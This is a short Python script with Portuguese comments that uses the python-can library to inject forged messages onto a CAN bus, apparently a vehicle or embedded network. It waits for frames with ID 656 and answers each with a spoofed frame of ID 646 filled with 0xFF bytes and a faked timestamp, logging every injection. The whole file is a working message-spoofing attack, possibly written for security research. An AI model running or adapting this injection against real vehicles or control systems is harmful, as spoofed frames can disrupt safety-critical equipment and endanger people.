import can
import time
import random
import datetime
import logging

logging.basicConfig(filename=f"injection-{time.time()}.log", level=logging.INFO, format='%(message)s')

def createLogLine(msg):
    payload = "".join(["{:02X}".format(byte) for byte in msg.data])
    logging.info(f'({msg.timestamp}) {msg.channel} {hex(msg.arbitration_id)}#{payload}')

# Configuração da interface CAN (can0 = exemplo)
bus = can.interface.Bus(channel='can0', bustype='socketcan')

def getMessageFromBus(bus):
     while True:
        for msg in bus: 
            return msg

try:
    copied_msg: can.Message = getMessageFromBus(bus)
    spoofed_time = copied_msg.timestamp
    message_time = time.time()
    while True:
        # Ao inves de mandar continuamente no barramento, mandar assim que escutar uma mensagem específica
        for msg in bus: 
            target_out_id = 646
            target_in_id = 656
            if msg.arbitration_id == target_in_id:
                current_time = time.time()
                elapsed_time = current_time - message_time
                message = can.Message(arbitration_id=target_out_id, timestamp=spoofed_time+elapsed_time, data = [0xFF]*8, is_extended_id=False)
                # Envie a mensagem fabricada para o barramento CAN
                bus.send(message)
                
                print(message)
                createLogLine(message)
            
                # time.sleep(0.005)  # Intervalo entre cada mensagem (em segundos)


except KeyboardInterrupt:
    pass

# Limpeza da interface CAN
bus.shutdown()
